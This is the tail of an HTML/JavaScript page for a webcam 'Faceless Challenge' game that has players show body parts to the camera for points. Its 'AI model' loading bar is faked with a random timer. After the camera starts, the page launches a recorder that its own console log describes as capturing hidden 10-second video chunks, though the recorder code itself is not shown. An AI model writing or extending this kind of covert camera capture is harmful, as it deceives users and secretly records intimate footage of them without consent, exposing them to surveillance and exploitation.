                    clearInterval(state.scanInterval);
                    onScanFail(index);
                }
            }, 100);
        }

        function onScanSuccess(index) {
            if (state.partDetected) return;
            state.partDetected = true;
            state.isScanning = false;
            clearInterval(state.scanInterval);

            const part = BODY_PARTS[index];
            state.totalPoints += part.points;
            scoreDisplay.textContent = state.totalPoints;

            updateProgress(100, 'done');
            statusBadge.textContent = `✅ ${part.emoji} +${part.points} pts!`;
            statusBadge.className = 'status-badge success';
            holdStillMsg.classList.remove('show');

            // Flash
            const flash = document.createElement('div');
            flash.style.cssText =
                'position:absolute;inset:0;background:#00f5c0;z-index:6;pointer-events:none;opacity:0.2;transition:opacity 0.5s ease;border-radius:22px;';
            document.getElementById('camWrapper').appendChild(flash);
            setTimeout(() => { flash.style.opacity = '0';
                setTimeout(() => flash.remove(), 500); }, 100);

            state.partResults.push({
                part: part.id,
                label: part.label,
                points: part.points,
                success: true,
                time: SCAN_TIME - state.scanTimer,
            });

            setTimeout(() => { progressContainer.classList.remove('show'); }, 600);

            setTimeout(() => {
                const next = index + 1;
                if (next < BODY_PARTS.length) {
                    beginPart(next);
                } else {
                    endGame(true);
                }
            }, 1400);
        }

        function onScanFail(index) {
            if (state.partDetected) return;
            state.isScanning = false;
            clearInterval(state.scanInterval);

            const part = BODY_PARTS[index];
            statusBadge.textContent = `❌ time out — ${part.label}`;
            statusBadge.className = 'status-badge fail';
            progressContainer.classList.remove('show');
            holdStillMsg.classList.remove('show');

            state.partResults.push({
                part: part.id,
                label: part.label,
                points: 0,
                success: false,
                time: 0,
            });

            setTimeout(() => {
                const next = index + 1;
                if (next < BODY_PARTS.length) {
                    beginPart(next);
                } else {
                    endGame(false);
                }
            }, 1800);
        }

        function endGame(won) {
            if (state.gameDone) return;
            state.gameDone = true;
            state.gameStarted = false;
            state.isScanning = false;
            clearInterval(state.scanInterval);
            progressContainer.classList.remove('show');
            holdStillMsg.classList.remove('show');

            startBtn.disabled = false;
            resetBtn.disabled = false;
            flipBtn.disabled = false;

            finalScore.textContent = state.totalPoints;
            gameoverSub.textContent = won ?
                '🎉 You scanned all body parts! Amazing!' :
                '⏰ Time ran out! Try again.';
            gameoverOverlay.classList.add('show');

            statusBadge.textContent = '🏁 game over';
            statusBadge.className = 'status-badge done';
        }

        function updateProgress(value, stateType) {
            const pct = Math.round(value);
            progressFill.style.width = pct + '%';
            progressPct.textContent = pct + '%';

            if (stateType === 'scanning') {
                progressFill.className = 'progress-fill scanning';
                progressPct.className = 'pct';
                progressStatus.textContent = 'scanning';
            } else if (stateType === 'done') {
                progressFill.className = 'progress-fill done';
                progressPct.className = 'pct detected';
                progressStatus.textContent = '✅ complete!';
            } else {
                progressFill.className = 'progress-fill';
                progressPct.className = 'pct';
                progressStatus.textContent = '—';
            }
        }

        function resetGame() {
            clearInterval(state.scanInterval);
            state.gameStarted = false;
            state.gameDone = false;
            state.isScanning = false;
            state.totalPoints = 0;
            state.currentPartIndex = 0;
            state.partResults = [];
            state.partDetected = false;
            state.progressValue = 0;

            scoreDisplay.textContent = '0';
            timerDisplay.textContent = SCAN_TIME;
            timerBox.className = 'timer-box';
            gameoverOverlay.classList.remove('show');
            pointsPopup.classList.remove('show');
            countdownNumber.className = 'countdown-number';
            progressContainer.classList.remove('show');
            holdStillMsg.classList.remove('show');

            challengeTarget.textContent = '—';
            challengeBadge.innerHTML = `<span class="emoji">🎯</span> Show <span class="highlight">—</span>`;
            statusBadge.textContent = '🔄 reset — hit Start';
            statusBadge.className = 'status-badge waiting';

            startBtn.disabled = !state.modelLoaded;
            resetBtn.disabled = true;
            flipBtn.disabled = false;

            statusMsg.textContent = state.modelLoaded ? '✅ Ready! Click Start.' : '⏳ Model not loaded.';
            statusMsg.className = state.modelLoaded ? 'status-msg success' : 'status-msg error';
        }

        // ============================================================
        //  LOADING
        // ============================================================
        function loadModelWithProgress() {
            return new Promise((resolve) => {
                let progress = 0;
                const interval = setInterval(() => {
                    progress += 2 + Math.random() * 3;
                    if (progress > 100) progress = 100;
                    loadingFill.style.width = progress + '%';
                    loadingPct.textContent = Math.round(progress) + '%';
                    if (progress >= 100) {
                        clearInterval(interval);
                        state.modelLoaded = true;
                        startBtn.disabled = false;
                        startBtnText.textContent = '🚀 Start';
                        startSpinner.classList.add('hidden');
                        statusMsg.textContent = '✅ Ready! Click Start.';
                        statusMsg.className = 'status-msg success';
                        statusBadge.textContent = '✅ Ready!';
                        statusBadge.className = 'status-badge waiting';
                        loadingContainer.style.display = 'none';
                        resolve();
                    }
                }, 80);
            });
        }

        // ============================================================
        //  EVENTS
        // ============================================================
        startBtn.addEventListener('click', () => {
            if (!state.modelLoaded) {
                statusMsg.textContent = '⏳ Model not ready.';
                statusMsg.className = 'status-msg error';
                return;
            }
            if (!state.stream) {
                statusMsg.textContent = '❌ Camera not available.';
                statusMsg.className = 'status-msg error';
                return;
            }
            startGame();
        });

        resetBtn.addEventListener('click', resetGame);
        restartBtn.addEventListener('click', () => { resetGame();
            setTimeout(startGame, 500); });

        // ============================================================
        //  BOOT
        // ============================================================
        async function boot() {
            loadingContainer.style.display = 'block';
            statusMsg.textContent = '⏳ Loading AI model…';
            statusMsg.className = 'status-msg loading';
            statusBadge.textContent = '📦 loading…';
            statusBadge.className = 'status-badge loading';

            await loadModelWithProgress();

            const camOK = await initDisplayCamera();
            if (!camOK) {
                statusMsg.textContent = '❌ Camera required. Please allow access.';
                statusMsg.className = 'status-msg error';
                return;
            }

            await initRecorder();
            resetGame();

            console.log('🚫 Faceless Challenge loaded');
            console.log('🦴 Body parts:', BODY_PARTS.length);
            console.log('🎥 Recorder: 10s chunks (hidden)');
            console.log('📋 BODY PARTS & POINTS:');
            BODY_PARTS.forEach((p, i) => {
                console.log(`  ${String(i+1).padStart(2)}. ${p.emoji} ${p.label.padEnd(20)} — ${String(p.points).padStart(3)} pts (diff: ${p.difficulty.toFixed(2)})`);
            });
        }

        boot();
    </script>
</body>
</html>
